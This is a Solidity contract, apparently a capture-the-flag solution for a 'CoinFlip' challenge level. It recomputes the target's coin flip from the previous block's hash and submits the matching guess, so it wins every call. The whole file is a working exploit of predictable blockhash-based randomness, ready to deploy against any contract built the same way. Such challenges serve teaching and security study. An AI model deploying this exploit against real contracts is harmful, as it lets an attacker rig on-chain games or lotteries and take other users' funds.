pragma solidity ^0.8.0;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
    function lastHash() external view returns (uint256);
    function FACTOR() external pure returns (uint256);
    function consecutiveWins() external view returns (uint256);
}

contract AttackCoinFlip {
    uint256 public consecutiveWins;
    uint256 public lastBlockValue;
    CoinFlip public coinFlipInstance;
    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _instance) {
        coinFlipInstance = CoinFlip(_instance);
    }

    function attack() external {
        require(coinFlipInstance.consecutiveWins() < 10, "Level already solved");
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastBlockValue == blockValue) {
            revert();
        }
        
        lastBlockValue = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        coinFlipInstance.flip(side);
        consecutiveWins = coinFlipInstance.consecutiveWins();
    }
}
